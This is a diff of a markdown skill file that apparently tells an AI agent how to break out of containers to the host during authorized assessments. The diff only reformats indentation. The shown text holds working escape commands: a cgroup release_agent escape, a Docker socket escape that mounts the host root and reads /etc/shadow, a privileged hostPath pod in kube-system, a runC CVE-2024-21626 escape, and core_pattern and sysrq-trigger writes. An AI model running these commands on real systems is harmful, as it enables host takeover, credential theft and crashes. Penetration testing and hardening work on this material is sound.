@@ -1,13 +1,13 @@
 ---
 name: escaping-containers-to-host
 description: >-
-  Exploits privileged pods, host mounts, runC CVEs, and exposed Docker sockets to break out of
-  a container and reach the underlying host during an authorized container-security
-  assessment. Use when executing an approved breakout test, demonstrating the real impact of a
-  privileged or hostPath workload, or validating that escape mitigations actually hold.
-  Keywords: container breakout, privileged, hostPath, docker.sock, runC CVE-2019-5736,
-  CVE-2024-21626, release_agent, nsenter. Do not use for defensive detection of these
-  techniques - use detecting-container-escape-attempts.
+ Exploits privileged pods, host mounts, runC CVEs, and exposed Docker sockets to break out of
+ a container and reach the underlying host during an authorized container-security
+ assessment. Use when executing an approved breakout test, demonstrating the real impact of a
+ privileged or hostPath workload, or validating that escape mitigations actually hold.
+ Keywords: container breakout, privileged, hostPath, docker.sock, runC CVE-2019-5736,
+ CVE-2024-21626, release_agent, nsenter. Do not use for defensive detection of these
+ techniques - use detecting-container-escape-attempts.
 domain: cybersecurity
 subdomain: container-security
 tags:
@@ -56,16 +56,16 @@ Sources: Palo Alto Networks "Leaky Vessels" advisory; Sysdig "New runc vulnerabi
 - Authorization (signed rules of engagement) covering host/node compromise
 - A foothold: a shell inside a target container
 - Reconnaissance utilities inside the container or staged in:
-  ```bash
-  # deepce - Docker enumeration and escape
-  git clone https://github.com/stealthcopter/deepce.git
-  # amicontained - container introspection (capabilities, seccomp, namespaces)
-  curl -L https://github.com/genuinetools/amicontained/releases/download/v0.4.9/amicontained-linux-amd64 -o amicontained
-  chmod +x amicontained
-  # CDK - zero-dependency K8s/container pentest toolkit
-  curl -L https://github.com/cdk-team/CDK/releases/latest/download/cdk_linux_amd64 -o cdk
-  chmod +x cdk
-  ```
+ ```bash
+ # deepce - Docker enumeration and escape
+ git clone https://github.com/stealthcopter/deepce.git
+ # amicontained - container introspection (capabilities, seccomp, namespaces)
+ curl -L https://github.com/genuinetools/amicontained/releases/download/v0.4.9/amicontained-linux-amd64 -o amicontained
+ chmod +x amicontained
+ # CDK - zero-dependency K8s/container pentest toolkit
+ curl -L https://github.com/cdk-team/CDK/releases/latest/download/cdk_linux_amd64 -o cdk
+ chmod +x cdk
+ ```
 - A lab cluster/host you are permitted to break out of (e.g., kind, minikube, or a dedicated VM)
 
 ## Objectives
@@ -105,8 +105,8 @@ ls -la /var/run/docker.sock 2>/dev/null
 findmnt -o TARGET,SOURCE,FSTYPE,OPTIONS
 
 # Sharing host namespaces? (host PID = can see host processes)
-ps aux | head        # if you see systemd/host pids, hostPID:true
-ls -la /proc/1/root  # if readable as host root, namespace is shared
+ps aux | head # if you see systemd/host pids, hostPID:true
+ls -la /proc/1/root # if readable as host root, namespace is shared
 
 # Automated enumeration
 ./deepce.sh
@@ -121,7 +121,7 @@ A `--privileged` container (or one with `CAP_SYS_ADMIN`) can mount a cgroup hier
 # Confirm we can mount (CAP_SYS_ADMIN present)
 # Create a cgroup mount and enable release_agent notification
 mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null || \
-  mount -t cgroup -o memory cgroup /tmp/cgrp
+ mount -t cgroup -o memory cgroup /tmp/cgrp
 mkdir /tmp/cgrp/x
 echo 1 > /tmp/cgrp/x/notify_on_release
 
@@ -140,7 +140,7 @@ chmod +x /cmd
 
 # Trigger: spawn and immediately exit a process in the cgroup
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
-cat /output   # host process list / shadow proves escape
+cat /output # host process list / shadow proves escape
 ```
 
 ### Step 3: Escape via a Mounted Docker Socket
@@ -150,19 +150,19 @@ If `/var/run/docker.sock` is bind-mounted into the container, you control the ho
 ```bash
 # Confirm reachability
 docker -H unix:///var/run/docker.sock version 2>/dev/null || \
-  curl -s --unix-socket /var/run/docker.sock http://localhost/version
+ curl -s --unix-socket /var/run/docker.sock http://localhost/version
 
 # Launch a privileged container mounting host / and chroot into it
 docker -H unix:///var/run/docker.sock run -it --rm \
-  --privileged --net=host --pid=host \
-  -v /:/host alpine chroot /host sh
+ --privileged --net=host --pid=host \
+ -v /:/host alpine chroot /host sh
 
 # Pure-curl variant (no docker CLI in container):
 curl -s -XPOST --unix-socket /var/run/docker.sock \
-  -H "Content-Type: application/json" \
-  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/etc/shadow"],
-       "Binds":["/:/host"],"Privileged":true}' \
-  http://localhost/containers/create?name=esc
+ -H "Content-Type: application/json" \
+ -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/etc/shadow"],
+ "Binds":["/:/host"],"Privileged":true}' \
+ http://localhost/containers/create?name=esc
 curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/esc/start
 ```
 
@@ -183,14 +183,14 @@ apiVersion: v1
 kind: Pod
 metadata: {name: pwn, namespace: kube-system}
 spec:
-  hostPID: true
-  containers:
-  - name: pwn
-    image: alpine
-    command: ["/bin/sh","-c","sleep 1d"]
-    securityContext: {privileged: true}
-    volumeMounts: [{name: host, mountPath: /host}]
-  volumes: [{name: host, hostPath: {path: /}}]
+ hostPID: true
+ containers:
+ - name: pwn
+ image: alpine
+ command: ["/bin/sh","-c","sleep 1d"]
+ securityContext: {privileged: true}
+ volumeMounts: [{name: host, mountPath: /host}]
+ volumes: [{name: host, hostPath: {path: /}}]
 EOF
 ```
 
@@ -200,7 +200,7 @@ If the runtime is runC <= 1.1.11, the leaked host-cwd fd can be used. With `dock
 
 ```bash
 # Detect vulnerable runtime version (host or via runc binary in image)
-runc --version          # vulnerable: 1.0.0-rc93 .. 1.1.11
+runc --version # vulnerable: 1.0.0-rc93 .. 1.1.11
 docker info --format '{{.DefaultRuntime}}'
 
 # Proof-of-concept via a malicious image WORKDIR (run-time variant)
@@ -214,7 +214,7 @@ docker build --no-cache -t leaky .
 
 # Run-time variant: the container lands in a host directory
 docker run --rm --workdir /proc/self/fd/8 alpine \
-  sh -c 'cd ../../../.. && cat etc/shadow'
+ sh -c 'cd ../../../.. && cat etc/shadow'
 # Reference PoC: github.com/strikoder/cve-2024-21626-runc-1.1.11-escape
 ```
 
@@ -224,17 +224,17 @@ For runC <= 1.2.7 / 1.3.2 / 1.4.0-rc.2, CVE-2025-31133/52565/52881 abuse a race 
 
 ```bash
 # Confirm vulnerable runtime
-runc --version   # vulnerable: <= 1.2.7, 1.3.2, 1.4.0-rc.2
+runc --version # vulnerable: <= 1.2.7, 1.3.2, 1.4.0-rc.2
 
 # Conceptual exploitation flow (use maintainers' PoC in a lab):
-#  1. Start a container that, during init, swaps the /dev/console (or a
-#     custom device) bind-mount target for a symlink to /proc/sysrq-trigger.
-#  2. Win the race so runc bind-mounts it read-write before maskedPaths apply.
-#  3. Redirect a write to host procfs:
-echo c > /proc/sysrq-trigger     # would crash host (DoS) - demonstrates RW
-#  4. For code exec, redirect the write to /proc/sys/kernel/core_pattern:
+# 1. Start a container that, during init, swaps the /dev/console (or a
+# custom device) bind-mount target for a symlink to /proc/sysrq-trigger.
+# 2. Win the race so runc bind-mounts it read-write before maskedPaths apply.
+# 3. Redirect a write to host procfs:
+echo c > /proc/sysrq-trigger # would crash host (DoS) - demonstrates RW
+# 4. For code exec, redirect the write to /proc/sys/kernel/core_pattern:
 echo '|/bin/sh -c "id>/host_pwn"' > /proc/sys/kernel/core_pattern
-#     then trigger a core dump in any host-visible process.
+# then trigger a core dump in any host-visible process.
 # Advisories: GHSA-cgrx-mc8f-2prm, GHSA-9493-h29p-rfm2
 ```
 
@@ -242,12 +242,12 @@ echo '|/bin/sh -c "id>/host_pwn"' > /proc/sys/kernel/core_pattern
 
 ```bash
 # Verify runtimes are patched
-runc --version              # want >= 1.2.8 / 1.3.3 / 1.4.0-rc.3 (and != vuln 1.1.x)
-docker version --format '{{.Server.Version}}'   # >= 25.0.2 for CVE-2024-21626
-containerd --version        # >= 1.6.28 / 1.7.13
+runc --version # want >= 1.2.8 / 1.3.3 / 1.4.0-rc.3 (and != vuln 1.1.x)
+docker version --format '{{.Server.Version}}' # >= 25.0.2 for CVE-2024-21626
+containerd --version # >= 1.6.28 / 1.7.13
 
 # Confirm hardening for misconfig escapes
-docker inspect <ctr> --format '{{.HostConfig.Privileged}}'   # want false
+docker inspect <ctr> --format '{{.HostConfig.Privileged}}' # want false
 kubectl get pod <pod> -o jsonpath='{.spec.containers[*].securityContext}'
 ```
 
